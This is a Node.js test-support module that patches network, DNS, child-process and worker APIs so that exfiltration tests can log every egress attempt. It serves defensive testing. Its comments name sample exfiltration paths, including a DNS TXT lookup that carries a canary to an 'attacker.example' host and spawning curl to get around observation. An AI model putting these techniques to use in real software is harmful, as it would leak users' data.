// Test-support egress observer (review round 1): preloaded into a child via `--import`, it
// records every attempt to reach the network through Node's own APIs — TCP (which HTTP, TLS
// and fetch/undici all ride), UDP, the WHOLE dns surface, and the global fetch entry point —
// as one JSON line per attempt in SPENDBAR_NET_LOG. It observes and never blocks: the
// exfiltration tests assert on the recorded attempts, and their positive control proves the
// recording works by moving a canary through this exact interception path.
//
// Two round-1 chunk-16 corrections, both cases where the observer would have stayed silent
// while a canary left the process:
//
//   * DNS was `lookup` only. A name lookup is not the only way to put bytes in a query:
//     `dns.resolveTxt("<canary>.attacker.example")` needs no TCP and no UDP socket through the
//     patched methods, so the whole resolver surface — callback, promise, and Resolver
//     instances — is recorded now.
//   * A DESCENDANT is not observed at all. `child_process.spawn("curl", …)`, a Node child
//     without this preload, or a Worker with its own execArgv all reach the network outside
//     every patch here. They cannot be observed from inside this process, so they are recorded
//     as what they are: the creation of an unobserved execution context. The tests treat any
//     such record as a violation, because "no egress was observed" is only a claim about
//     egress if nothing could have escaped observation.
//
// Scope, stated honestly: this sees Node-API egress from THIS process, plus the creation of
// contexts it cannot see into. A native addon could bypass it, which is precluded separately —
// the supply-chain gate refuses any closure that carries native-build machinery.

import net from "node:net";
import dgram from "node:dgram";
import dns from "node:dns";
import child_process from "node:child_process";
import worker_threads from "node:worker_threads";
import { appendFileSync } from "node:fs";

const LOG = process.env.SPENDBAR_NET_LOG;

function record(api, args) {
  if (!LOG) return;
  const a = args[0];
  const detail =
    a !== null && typeof a === "object"
      ? { host: a.host ?? a.hostname, port: a.port, path: a.path }
      : { arg: typeof a === "string" ? a : a === undefined ? undefined : String(a) };
  try {
    appendFileSync(LOG, JSON.stringify({ api, detail }) + "\n");
  } catch {
    // The observer must never crash the observed process; a lost record surfaces as a
    // failed positive control, never as a false "no egress".
  }
}

function wrapMethod(target, name, api) {
  const original = target[name];
  target[name] = function (...args) {
    record(api, args);
    return original.apply(this, args);
  };
}

wrapMethod(net.Socket.prototype, "connect", "net.Socket.connect");
wrapMethod(dgram.Socket.prototype, "send", "dgram.send");
wrapMethod(dgram.Socket.prototype, "connect", "dgram.connect");

// The whole resolver surface, not just `lookup`: every one of these puts a caller-controlled
// name on the wire. Enumerated from the module's own exports so a Node version that adds a
// record type is covered without editing this list.
const DNS_METHODS = ["lookup", "lookupService", "reverse", ...Object.keys(dns).filter((k) => k.startsWith("resolve"))];
for (const name of DNS_METHODS) {
  if (typeof dns[name] === "function") wrapMethod(dns, name, `dns.${name}`);
  if (typeof dns.promises?.[name] === "function") wrapMethod(dns.promises, name, `dns.promises.${name}`);
  // A Resolver instance holds its own methods and never goes through the module object.
  if (typeof dns.Resolver?.prototype?.[name] === "function") {
    wrapMethod(dns.Resolver.prototype, name, `dns.Resolver.${name}`);
  }
  if (typeof dns.promises?.Resolver?.prototype?.[name] === "function") {
    wrapMethod(dns.promises.Resolver.prototype, name, `dns.promises.Resolver.${name}`);
  }
}

// Creating an execution context this observer cannot see into. Recorded as an egress
// CAPABILITY: the child may or may not reach the network, and that is exactly the problem —
// nothing here can say which.
//
// Patched in two places, because one is not enough. Node snapshots a builtin's ESM named
// exports when the module facade is instantiated — which this preload does itself, before it
// patches anything — so `import { spawn } from "node:child_process"` holds the ORIGINAL
// function and sails past a property patch. Every ASYNCHRONOUS path funnels through
// `ChildProcess.prototype.spawn` whatever the import style, so that is where the reliable
// observation goes; the property patches remain for `require()` and namespace access.
//
// The residual blind spot, stated rather than papered over: the SYNCHRONOUS spawns
// (`spawnSync`/`execSync`/`execFileSync`) and `new Worker(...)` reached through an ESM NAMED
// import go straight to an internal binding or constructor with no userland funnel, and are
// not observed. Closing that needs Node's permission model (--experimental-permission denies
// child processes and workers outright) rather than any patch from inside the process; the
// tests below record which paths each control actually covers, so the gap is visible.
for (const name of ["spawn", "spawnSync", "exec", "execSync", "execFile", "execFileSync", "fork"]) {
  if (typeof child_process[name] === "function") wrapMethod(child_process, name, `child_process.${name}`);
}
if (typeof child_process.ChildProcess?.prototype?.spawn === "function") {
  wrapMethod(child_process.ChildProcess.prototype, "spawn", "child_process.ChildProcess.spawn");
}
if (typeof worker_threads.Worker === "function") {
  const OriginalWorker = worker_threads.Worker;
  worker_threads.Worker = function Worker(...args) {
    record("worker_threads.Worker", args);
    return new OriginalWorker(...args);
  };
  worker_threads.Worker.prototype = OriginalWorker.prototype;
}

if (typeof globalThis.fetch === "function") wrapMethod(globalThis, "fetch", "fetch");
